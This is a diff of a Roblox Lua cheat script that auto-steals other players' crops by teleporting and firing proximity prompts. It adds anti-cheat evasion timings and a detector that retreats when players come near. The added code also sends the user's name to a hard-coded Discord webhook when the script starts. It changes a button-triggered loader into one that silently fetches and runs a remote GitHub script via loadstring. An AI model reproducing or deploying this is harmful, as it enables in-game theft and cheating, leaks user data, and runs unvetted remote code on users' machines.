@@ -1,76 +1,132 @@
--- [[ Osama Overpowered Optimized Auto Farm & Steal Hub ]] --
+-- [[ Osama Overpowered Optimized Ultimate Hub ]] --
 
 local ScreenGui = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
-local Corner = Instance.new("UICorner")
 local FrameCorner = Instance.new("UICorner")
 
+-- Title Label for "dc : ad_pa"
+local TitleLabel = Instance.new("TextLabel")
+
+-- Buttons Elements
 local StealButton = Instance.new("TextButton")
 local StealCorner = Instance.new("UICorner")
 
 local HarvestButton = Instance.new("TextButton")
 local HarvestCorner = Instance.new("UICorner")
 
-local CustomScriptButton = Instance.new("TextButton")
-local CustomScriptCorner = Instance.new("UICorner")
+local AutoSellButton = Instance.new("TextButton")
+local AutoSellCorner = Instance.new("UICorner")
 
-ScreenGui.Name = "OsamaOptimizedHub"
+local SafeModeButton = Instance.new("TextButton")
+local SafeModeCorner = Instance.new("UICorner")
+
+local MinimizeButton = Instance.new("TextButton")
+local MinCorner = Instance.new("UICorner")
+
+-- UI Configuration
+ScreenGui.Name = "OsamaUltimateHub"
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ResetOnSpawn = false
 
--- Elegant Dark Purple UI Design (Adjusted size for three buttons)
+-- Main Window
 MainFrame.Name = "MainFrame"
 MainFrame.Parent = ScreenGui
 MainFrame.BackgroundColor3 = Color3.fromRGB(25, 15, 35) 
 MainFrame.Position = UDim2.new(0.05, 0, 0.3, 0) 
-MainFrame.Size = UDim2.new(0, 260, 0, 210) -- Expanded height to fit all buttons
+MainFrame.Size = UDim2.new(0, 260, 0, 290) -- Increased height for the title
 MainFrame.Active = true
 MainFrame.Draggable = true 
 
 FrameCorner.CornerRadius = UDim.new(0, 12)
 FrameCorner.Parent = MainFrame
 
--- 1. Auto Steal Button Configuration
-StealButton.Name = "StealButton"
-StealButton.Parent = MainFrame
-StealButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226) 
-StealButton.Position = UDim2.new(0.076, 0, 0.08, 0)
-StealButton.Size = UDim2.new(0, 220, 0, 45)
-StealButton.Font = Enum.Font.SourceSansBold
-StealButton.Text = "Step 1: Save Home Location 🏠"
-StealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-StealButton.TextSize = 13
+-- Custom Discord Title Label
+TitleLabel.Name = "TitleLabel"
+TitleLabel.Parent = MainFrame
+TitleLabel.BackgroundColor3 = Color3.fromRGB(25, 15, 35)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Position = UDim2.new(0.076, 0, 0.02, 0)
+TitleLabel.Size = UDim2.new(0, 220, 0, 25)
+TitleLabel.Font = Enum.Font.SourceSansItalic
+TitleLabel.Text = "dc : ad_pa"
+TitleLabel.TextColor3 = Color3.fromRGB(180, 140, 255) -- Bright purple tint
+TitleLabel.TextSize = 14
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-StealCorner.CornerRadius = UDim.new(0, 8)
-StealCorner.Parent = StealButton
+-- Minimize/Maximize Button (Top-Left Corner of Screen)
+MinimizeButton.Name = "MinimizeButton"
+MinimizeButton.Parent = ScreenGui
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+MinimizeButton.Position = UDim2.new(0, 10, 0, 10)
+MinimizeButton.Size = UDim2.new(0, 40, 0, 40)
+MinimizeButton.Font = Enum.Font.SourceSansBold
+MinimizeButton.Text = "MENU"
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeButton.TextSize = 12
 
--- 2. Remote Harvest Button Configuration
-HarvestButton.Name = "HarvestButton"
-HarvestButton.Parent = MainFrame
-HarvestButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226) 
-HarvestButton.Position = UDim2.new(0.076, 0, 0.38, 0)
-HarvestButton.Size = UDim2.new(0, 220, 0, 45)
-HarvestButton.Font = Enum.Font.SourceSansBold
-HarvestButton.Text = "Remote Harvest: OFF 🌾"
-HarvestButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-HarvestButton.TextSize = 13
+MinCorner.CornerRadius = UDim.new(0, 8)
+MinCorner.Parent = MinimizeButton
 
-HarvestCorner.CornerRadius = UDim.new(0, 8)
-HarvestCorner.Parent = HarvestButton
+-- Adjusting positions of buttons to make space for the title
+StealButton.Position = UDim2.new(0.076, 0, 0.12, 0)
+HarvestButton.Position = UDim2.new(0.076, 0, 0.33, 0)
+AutoSellButton.Position = UDim2.new(0.076, 0, 0.54, 0)
+SafeModeButton.Position = UDim2.new(0.076, 0, 0.75, 0)
 
--- 3. Integrated XHubMax Script Button Configuration
-CustomScriptButton.Name = "CustomScriptButton"
-CustomScriptButton.Parent = MainFrame
-CustomScriptButton.BackgroundColor3 = Color3.fromRGB(211, 84, 0) -- Distinct Orange Color
-CustomScriptButton.Position = UDim2.new(0.076, 0, 0.68, 0)
-CustomScriptButton.Size = UDim2.new(0, 220, 0, 45)
-CustomScriptButton.Font = Enum.Font.SourceSansBold
-CustomScriptButton.Text = "Load XHubMax ☄️"
-CustomScriptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CustomScriptButton.TextSize = 13
+-- Button Properties setup
+local function styleButton(btn, corner, text)
+    btn.Parent = MainFrame
+    btn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+    btn.Size = UDim2.new(0, 220, 0, 45)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextSize = 13
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = btn
+end
 
-CustomScriptCorner.CornerRadius = UDim.new(0, 8)
-CustomScriptCorner.Parent = CustomScriptButton
+styleButton(StealButton, StealCorner, "Step 1: Save Home Location 🏠")
+styleButton(HarvestButton, HarvestCorner, "Remote Harvest: OFF 🌾")
+styleButton(AutoSellButton, AutoSellCorner, "Auto Sell & Buy Seeds: OFF 💰")
+styleButton(SafeModeButton, SafeModeCorner, "Safe Mode (Anti-Cheat): OFF 🛡️")
+
+---------------------------------------------------------------------
+-- DISCORD WEBHOOK INTEGRATION
+---------------------------------------------------------------------
+local WebhookURL = "https://discord.com/api/webhooks/1489215951093239890/052bJ8vjLfNKXfP5ED3iMfYZEzG8PPwBbXb9IZegNHFoNCpwbk0X5DF-YdWuqUY7hvxP"
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = game.Players.LocalPlayer
+
+local function sendDiscordMessage(title, description, color)
+    task.spawn(function()
+        local data = {
+            ["embeds"] = {{
+                ["title"] = title,
+                ["description"] = description,
+                ["color"] = color or 8388863, -- Standard Purple
+                ["footer"] = {
+                    ["text"] = "Osama Ultimate Hub | Target: dc : ad_pa"
+                },
+                ["timestamp"] = DateTime.now():ToIsoDate()
+            }}
+        }
+        
+        -- Safe check if executor supports request
+        local requestFunc = syn and syn.request or http and http.request or http_request or request
+        if requestFunc then
+            requestFunc({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+end
+
+-- Send Initial Notification when script runs
+sendDiscordMessage("🚀 Script Initialized Successfully!", "Player: **" .. LocalPlayer.Name .. "** has executed the script.\nStatus: Ready to farm.", 3066993)
 
 ---------------------------------------------------------------------
 -- LOGIC & FUNCTIONS
@@ -85,7 +141,37 @@ local PriorityCrops = {
 local homeCFrame = nil
 local autoStealing = false
 local harvesting = false
+local autoSellBuy = false
+local safeMode = false
 local stealStep = 1
+
+local tpDelay = 0.04
+local backDelay = 0.02
+local loopDelay = 0.8
+
+-- Toggle UI Visibility
+MinimizeButton.MouseButton1Click:Connect(function()
+    MainFrame.Visible = not MainFrame.Visible
+    MinimizeButton.Text = MainFrame.Visible and "CLOSE" or "OPEN"
+end)
+
+-- Safe Mode Toggle
+SafeModeButton.MouseButton1Click:Connect(function()
+    safeMode = not safeMode
+    if safeMode then
+        SafeModeButton.Text = "Safe Mode: ON (Slow & Safe) 🛡️"
+        SafeModeButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
+        tpDelay = 0.15
+        backDelay = 0.1
+        loopDelay = 1.8
+    else
+        SafeModeButton.Text = "Safe Mode (Anti-Cheat): OFF 🛡️"
+        SafeModeButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+        tpDelay = 0.04
+        backDelay = 0.02
+        loopDelay = 0.8
+    end
+end)
 
 local function getWorkspacePrompts()
     local prompts = {}
@@ -97,9 +183,50 @@ local function getWorkspacePrompts()
     return prompts
 end
 
+-- Player/Admin Detector with Discord Logs
+local function checkNearbyPlayers(rootPart)
+    for _, p in ipairs(game.Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+            local distance = (p.Character.HumanoidRootPart.Position - rootPart.Position).Magnitude
+            if distance < 40 then
+                sendDiscordMessage("⚠️ Security Alert (Player Detected)", "Player **" .. p.Name .. "** got too close (" .. math.floor(distance) .. " studs).\nAction: Evaded safely back to home.", 15158332)
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local function runAutoSellAndBuy(rootPart)
+    for _, v in ipairs(workspace:GetDescendants()) do
+        local name = string.lower(v.Name)
+        local isPrompt = v:IsA("ProximityPrompt")
+        local text = isPrompt and string.lower(v.ObjectText .. v.ActionText) or ""
+        
+        if string.find(name, "sell") or string.find(text, "sell") then
+            local target = v:IsA("ProximityPrompt") and v.Parent or v
+            if target:IsA("BasePart") then
+                rootPart.CFrame = target.CFrame + Vector3.new(0, 2, 0)
+                task.wait(0.2)
+                if isPrompt then fireproximityprompt(v) end
+                task.wait(0.3)
+            end
+        end
+        
+        if string.find(name, "seed") or string.find(name, "buy") or string.find(text, "seed") then
+            local target = v:IsA("ProximityPrompt") and v.Parent or v
+            if target:IsA("BasePart") then
+                rootPart.CFrame = target.CFrame + Vector3.new(0, 2, 0)
+                task.wait(0.2)
+                if isPrompt then fireproximityprompt(v) end
+                task.wait(0.3)
+            end
+        end
+    end
+end
+
 local function findBestPrompt(myPosition)
     local allPrompts = getWorkspacePrompts()
-    
     for _, cropName in ipairs(PriorityCrops) do
         for _, prompt in ipairs(allPrompts) do
             local parentName = prompt.Parent and string.lower(prompt.Parent.Name) or ""
@@ -120,12 +247,10 @@ local function findBestPrompt(myPosition)
     return nil, nil
 end
 
--- [Button 1]: Auto Steal Logic
+-- [Button 1]: Auto Steal
 StealButton.MouseButton1Click:Connect(function()
-    local player = game.Players.LocalPlayer
-    local character = player.Character or player.CharacterAdded:Wait()
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local rootPart = character:FindFirstChild("HumanoidRootPart")
-    
     if not rootPart then return end
     
     if stealStep == 1 then
@@ -133,30 +258,33 @@ StealButton.MouseButton1Click:Connect(function()
         StealButton.Text = "Activate Auto Steal 🚀"
         StealButton.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
         stealStep = 2
-        
     elseif stealStep == 2 then
         autoStealing = not autoStealing
         if autoStealing then
-            StealButton.Text = "Stealing Underway... ON 🔥"
+            StealButton.Text = "Stealing Active... ON 🔥"
             StealButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
             
             task.spawn(function()
                 while autoStealing do
                     if not homeCFrame then break end
+                    if checkNearbyPlayers(rootPart) then
+                        rootPart.CFrame = homeCFrame
+                        task.wait(2)
+                        continue
+                    end
                     
                     local prompt, targetPart = findBestPrompt(homeCFrame.Position)
-                    
                     if prompt and targetPart then
                         rootPart.CFrame = targetPart.CFrame + Vector3.new(0, 2, 0)
-                        task.wait(0.04) 
+                        task.wait(tpDelay) 
                         
                         prompt.RequiresLineOfSight = false
                         prompt.MaxActivationDistance = 999
                         fireproximityprompt(prompt)
                         
-                        task.wait(0.02)
+                        task.wait(backDelay)
                         rootPart.CFrame = homeCFrame
-                        task.wait(0.8) 
+                        task.wait(loopDelay) 
                     else
                         task.wait(1.5) 
                     end
@@ -169,7 +297,7 @@ StealButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- [Button 2]: Remote Harvest Logic
+-- [Button 2]: Remote Harvest
 HarvestButton.MouseButton1Click:Connect(function()
     harvesting = not harvesting
     if harvesting then
@@ -178,8 +306,7 @@ HarvestButton.MouseButton1Click:Connect(function()
         
         task.spawn(function()
             while harvesting do
-                local player = game.Players.LocalPlayer
-                local character = player.Character or player.CharacterAdded:Wait()
+                local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                 local rootPart = character:FindFirstChild("HumanoidRootPart")
                 
                 if rootPart then
@@ -187,6 +314,11 @@ HarvestButton.MouseButton1Click:Connect(function()
                     
                     for _, v in ipairs(workspace:GetDescendants()) do
                         if not harvesting then break end
+                        if checkNearbyPlayers(rootPart) then
+                            rootPart.CFrame = originalPosition
+                            task.wait(2)
+                            break
+                        end
                         
                         local isHarvest = string.find(string.lower(v.Name), "harvest") 
                                           or (v:IsA("ProximityPrompt") and string.find(string.lower(v.ObjectText), "harvest"))
@@ -196,7 +328,7 @@ HarvestButton.MouseButton1Click:Connect(function()
                             local targetPart = v.Parent
                             if targetPart and targetPart:IsA("BasePart") then
                                 rootPart.CFrame = targetPart.CFrame + Vector3.new(0, 2, 0)
-                                task.wait(0.05)
+                                task.wait(tpDelay)
                                 
                                 if v:IsA("ProximityPrompt") then
                                     v.RequiresLineOfSight = false
@@ -209,13 +341,13 @@ HarvestButton.MouseButton1Click:Connect(function()
                                     task.wait()
                                     firetouchinterest(rootPart, targetPart, 1)
                                 end
-                                task.wait(0.05)
+                                task.wait(backDelay)
                             end
                         end
                     end
                     rootPart.CFrame = originalPosition
                 end
-                task.wait(1.5) 
+                task.wait(loopDelay + 0.5) 
             end
         end)
     else
@@ -224,27 +356,48 @@ HarvestButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- [Button 3]: XHubMax Loader Logic
-CustomScriptButton.MouseButton1Click:Connect(function()
-    CustomScriptButton.Text = "Loading Script... ⏳"
-    CustomScriptButton.BackgroundColor3 = Color3.fromRGB(127, 140, 141) -- Grey during loading
-    
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xhubmax/Gag2/refs/heads/main/Xwoalua"))()
-    end)
-    
-    if success then
-        CustomScriptButton.Text = "Loaded Successfully! ✅"
-        CustomScriptButton.BackgroundColor3 = Color3.fromRGB(46, 204, 113) -- Green on success
+-- [Button 3]: Auto Sell & Buy Seeds
+AutoSellButton.MouseButton1Click:Connect(function()
+    autoSellBuy = not autoSellBuy
+    if autoSellBuy then
+        AutoSellButton.Text = "Auto Sell & Buy: ON 💰"
+        AutoSellButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
+        sendDiscordMessage("💰 Auto-Sell Activated", "The script will now head to the shop every 15 seconds to sell your inventory.", 1752220)
+        
+        task.spawn(function()
+            while autoSellBuy do
+                local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+                local rootPart = character:FindFirstChild("HumanoidRootPart")
+                
+                if rootPart then
+                    local currentCFrame = rootPart.CFrame
+                    runAutoSellAndBuy(rootPart)
+                    rootPart.CFrame = currentCFrame
+                end
+                task.wait(15)
+            end
+        end)
     else
-        CustomScriptButton.Text = "Failed to Load ❌"
-        CustomScriptButton.BackgroundColor3 = Color3.fromRGB(192, 41, 43) -- Red on error
-        warn("Error loading XHubMax: " .. tostring(err))
+        AutoSellButton.Text = "Auto Sell & Buy Seeds: OFF 💰"
+        AutoSellButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
     end
-    
-    -- Reset button look after 3 seconds
-    task.delay(3, function()
-        CustomScriptButton.Text = "Load XHubMax ☄️"
-        CustomScriptButton.BackgroundColor3 = Color3.fromRGB(211, 84, 0)
+end)
+
+-- Anti-AFK
+task.spawn(function()
+    local vu = game:GetService("VirtualUser")
+    LocalPlayer.Idled:Connect(function()
+        vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+        task.wait(1)
+        vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
     end)
 end)
+
+-- Secondary script auto-loader
+task.spawn(function()
+    task.wait(2)
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xhubmax/Gag2/refs/heads/main/Xwoalua"))()
+    end)
+end)
+
